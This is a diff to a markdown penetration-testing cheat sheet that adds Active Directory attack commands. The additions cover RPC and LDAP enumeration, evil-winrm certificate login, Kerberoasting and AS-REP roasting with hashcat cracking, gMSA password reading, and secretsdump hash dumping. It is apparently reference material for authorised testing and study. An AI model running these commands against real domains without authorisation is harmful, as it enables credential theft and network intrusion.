@@ -92,6 +92,12 @@ crackmapexec smb ip -u users.txt -p password.txt
 ### Connect
 ```bash
 rpcclient ip -U user -L -h
+
+rpcclient $> enumdomusers
+rpcclient $> enumdomgroups
+rpcclient $> enumdomains
+rpcclient $> getdompwinfo
+rpcclient $> enumprivs
 ```
 
 ### List Services
@@ -102,6 +108,11 @@ services.py user:password@987@ip list
 rpcdump.py user:password@987@ip
 ```
 
+[IOXIDResolver](https://raw.githubusercontent.com/mubix/IOXIDResolver/master/IOXIDResolver.py) is used for remote enumeration of network interfaces
+```
+python IOXIDResolver.py -t IP
+```
+
 [*Impacket Docs*](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)
 
 # WinRM
@@ -110,6 +121,7 @@ rpcdump.py user:password@987@ip
 ### Connect with powershell
 ```bash
 evil-winrm -i ip -u user -p password
+evil-winrm -i ip -c certi.crt -k decrypted.key -p -u -S
 ```
 
 # Kerberos
@@ -128,6 +140,13 @@ Checking if Kerberos pre-authentication has been disabled for accounts
 GetNPUsers.py -usersfile user.txt -no-pass -format hashcat -dc-ip ip DOMAIN/
 ```
 
+### Enumusers
+
+With msfconsole we have able to list users form wordlists of users.
+```
+msf6 auxiliary(gather/kerberos_enumusers)
+```
+
 - [Kerberos cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
 
 # Ldap
@@ -139,6 +158,58 @@ Lightweight directory access protocol (LDAP) is a protocol that makes it possibl
 ```bash
 nmap -n -sV --script "ldap* and not brute" -p 389 ip
 ```
+
+### Ldapsearch
+
+```
+ldapsearch -x -h IP -b DC=EXAMPLE,DC=COM
+```
+
+### Ldapdomaindump
+
+
+[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) is a tool for gathering information of ldap. (you need to have creds of an user to use it)
+
+```
+ldapdomaindump IP -u 'DOMAIN\USER' -p PASSWORD --no-json --no-grep
+```
+
+### gMSADumper
+
+[gMSADumper](https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py) read the gMSA (group managed service accounts) password of the account.
+
+```
+python gMSADumper.py -u USER -p PASSWORD -d DOMAIN
+```
+
+# IMPACKET
+
+### GetUserSPNs
+[GetUserSPNs](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py) find Service Principal Names that are associated with normal user account, and exfiltrate the kerberos.
+
+```
+python GetUserSPNs.py -dc-ip IP -outputfile KERBEROS_FILE_OUTPUT -request -debug <DOMAIN>/<USER>
+
+hashcat -m 13100 --force -a 0 KERBEROS_FILE /usr/share/wordlists/rockyou.txt
+```
+
+### GetNPUsers
+
+[GetNPUsers.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/impacket_0_10_0/examples/GetNPUsers.py) will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set.
+
+```
+python GetNPUsers.py -usersfile USER_LIST_FILE -no-pass -dc-ip IP DOMAIN/
+```
+
+### secretsdump
+
+[secretsdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/impacket_0_10_0/examples/secretsdump.py) dumping Active Directory Password Hashes.
+
+```
+python secretsdump.py -just-dc-ntlm DOMAIN/USER@DOMAIN_CONTROLLER
+python secretsdump.py DOMAIN/USER:PASSWORD@IP
+```
+
 
 # Exfiltration
 ### Certificate
